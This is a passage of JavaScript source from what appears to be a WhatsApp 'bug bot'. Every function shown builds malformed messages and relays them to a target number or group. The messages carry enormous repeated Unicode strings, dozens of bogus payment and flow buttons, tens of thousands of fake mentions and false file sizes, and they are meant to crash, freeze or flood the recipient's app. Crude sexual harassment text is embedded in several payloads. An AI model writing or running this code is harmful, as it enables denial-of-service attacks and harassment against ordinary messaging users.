                    "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  await cay.relayMessage(
    target,
    msg.message,
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.green("CaywzzAjala"));
}
async function invob(target) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 3,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "🩸𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ ▾" + "꧀".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
          },
        },
      },
    },
  };

  await cay.relayMessage(target, message, {
    participant: {
      jid: target,
    },
  });
  console.log(chalk.yellow("OverLoad Flooding"));
}

const venomModsData = JSON.stringify({
  status: true,
  criador: "Caywzz",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"],
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true,
      },
    },
  },
});
async function CarouselXml(target, QBug, ptcp = true) {
  const haxxn = 10;
  const push = [];

  for (let i = 0; i < haxxn; i++) {
    push.push({
      body: {
        text: `\u0000\u0000\u0000\u0000\u0000`,
      },
      footer: {
        text: "",
      },
      header: {
        title: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟\u0000\u0000\u0000\u0000",
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
          fileLength: "591",
          height: 0,
          width: 0,
          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
          directPath:
            "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1721344123",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
          scansSidecar:
            "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
          scanLengths: [247, 201, 73, 63],
          midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=",
        },
      },
      nativeFlowMessage: {
        buttons: [],
      },
    });
  }

  const carousel = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            body: {
              text: "\u0000\u0000\u0000\u0000",
            },
            footer: {
              text: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
            },
            header: {
              hasMediaAttachment: false,
            },
            carouselMessage: {
              cards: push,
            },
          },
        },
      },
    },
    {
      quoted: QBug, // quoted dimasukkan di sini
    }
  );

  await cay.relayMessage(target, carousel.message, {
    messageId: carousel.key.id,
  });
}
async function EpUi(target, ptcp = true) {
  let msg = await generateWAMessageFromContent(
    X,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "xatanicvxii",
              hasMediaAttachment: false,
            },
            body: {
              text:
                "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*" +
                "ꦾ".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson:
                    "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                    "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  await cay.relayMessage(
    target,
    msg.message,
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
}
const GetsuVoidsTravasX = JSON.stringify({
  status: true,
  criador: "Caywzz",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"],
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true,
      },
    },
  },
});

async function ForceCloseOverButton(target) {
  cay.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ ",
          hasMediaAttachment: false,
        },
        body: {
          text: "\u0003".repeat(9000),
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "payment_method",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "call_permission_request",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
              voice_call: "call_galaxy",
            },
            {
              name: "form_message",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "wa_payment_learn_more",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "wa_payment_transaction_details",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "wa_payment_fbpin_reset",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "catalog_message",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "payment_info",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "review_order",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "send_location",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "payments_care_csat",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "view_product",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "payment_settings",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "address_message",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "automated_greeting_message_view_catalog",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "open_webview",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "message_with_link_status",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "payment_status",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "galaxy_costum",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "extensions_message_v2",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "landline_call",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            { name: "mpm", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
            {
              name: "cta_copy",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            { name: "cta_url", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
            {
              name: "review_and_pay",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "galaxy_message",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
            {
              name: "cta_call",
              buttonParamsJson: GetsuVoidsTravasX + "\u0003",
            },
          ],
        },
      },
    },
    { participant: { jid: target } }
  );
  console.log(chalk.red("Succes Send Combo"));
}
async function andros(target) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 3,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ X 𝗞𝗲͜͠𝗲𝗹͢𝗦𝗲̌𝗫 X —Jayy " + "꧀".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
          },
        },
      },
    },
  };
  await cay.relayMessage(target, message, {
    participant: {
      jid: target,
    },
  });
  console.log(chalk.yellow("Caywzz"));
}

async function TrashProtocol(target, mention) {
  const sex = Array.from({ length: 9741 }, (_, r) => ({
    title: "꧀".repeat(9741),
    rows: [`{ title: ${r + 1}, id: ${r + 1} }`],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
          listType: 2,
          buttonText: null,
          sections: sex,
          singleSelectReply: { selectedRowId: "💔" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "🇷🇺",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await cay.sendMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await cay.sendMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "⟅̊🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ ▾" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function BugGroup(jid, count) {
  for (let i = 0; i < count; i++) {
    const messageContent = generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⟅̊🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ ▾ ",
                hasMediaAttachment: false,
              },
              body: {
                text: "\u0003".repeat(9000),
              },
              nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                    voice_call: "call_galaxy",
                  },
                  {
                    name: "form_message",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "wa_payment_learn_more",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "wa_payment_transaction_details",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "wa_payment_fbpin_reset",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "catalog_message",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "payment_info",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "review_order",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "send_location",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "payments_care_csat",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "view_product",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "payment_settings",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "automated_greeting_message_view_catalog",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "open_webview",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "message_with_link_status",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "payment_status",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "galaxy_costum",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "extensions_message_v2",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "landline_call",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "review_and_pay",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: GetsuVoidsTravasX + "\u0003",
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );

    await cay.relayMessage(jid, messageContent.message, {
      messageId: messageContent.key.id,
    });

    console.log(chalk.red(`Sukses kirim BugViewOnce ke ${jid}`));
  }
}

async function sendViewOnceMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "xatanicvxii",
                hasMediaAttachment: false,
              },
              body: {
                text: "🌌",
              },
              nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                  {
                    name: "cta_url",
                    buttonParamsJson: "z",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );
    cay.relayMessage(jid, messageContent.message, {
      messageId: messageContent.key.id,
    });
  }
}

async function VampDelayMess(target) {
  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype:
                "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Starevz Nih",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath:
                "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "",
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "Starevxz - Caywzz\n" + "@15056662003".repeat(17000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson:
                  '{ display_text: \'Caywzz - Delay\', url: "https://t.me/xatanicvxii", merchant_url: "https://t.me/xatanicvxii" }',
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "{}",
              },
            ],
            messageParamsJson: "{}",
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                {
                  length: 30000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Starevxz Free Version",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath:
                  "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath:
                  "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256:
                  "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await cay.relayMessage(target, message, {
    participant: { jid: target },
  });
}

async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await cay.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function protocolbug5(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".xataa¡?" + "ោ៝".repeat(10000),
    title: "Apocalypse",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "jaja",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363334766163982@newsletter",
      serverMessageId: 1,
      newsletterName: "χඞ",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await cay.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await cay.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function protocolbug3(target, mention) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
            fileLength: "999999",
            seconds: 999999,
            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
            caption:
              "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
            height: 999999,
            width: 999999,
            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
            directPath:
              "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743742853",
            contextInfo: {
              isSampled: true,
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
            },
            streamingSidecar:
